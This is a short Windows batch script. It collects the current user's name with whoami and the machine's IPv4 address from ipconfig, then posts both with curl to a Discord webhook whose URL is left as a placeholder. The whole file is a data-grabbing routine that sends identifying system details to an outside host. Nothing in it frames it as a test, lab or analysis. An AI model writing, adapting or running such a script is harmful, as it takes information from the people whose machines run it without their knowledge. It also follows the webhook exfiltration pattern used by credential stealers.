@echo off
setlocal
for /f "tokens=*" %%u in ('whoami') do set "username=%%u"
for /f "tokens=14 delims= " %%i in ('ipconfig ^| findstr /R /C:"IPv4 Address"') do set "ipaddress=%%i"
set "webhook_url=YOUR_DISCORD_WEBHOOK_URL"
set "payload={\"content\": \"Username: %username%\nIP Address: %ipaddress%\"}"
curl -H "Content-Type: application/json" -d "%payload%" %webhook_url%
endlocal
pause
